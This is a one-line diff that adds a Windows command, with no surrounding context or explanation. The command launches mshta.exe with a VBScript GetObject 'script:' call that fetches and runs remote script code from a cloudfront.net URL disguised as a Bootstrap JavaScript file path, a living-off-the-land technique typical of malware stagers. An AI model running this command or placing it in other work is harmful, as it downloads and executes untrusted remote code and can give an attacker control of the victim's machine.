@@ -1,0 +1,1 @@
+cmd /c "mshta.exe vbscript:GetObject(""script:https://daq09367inkax.cloudfront.net/bootstrap/3.1.1/bootstrap.min.js/_cs"")(window.close)"
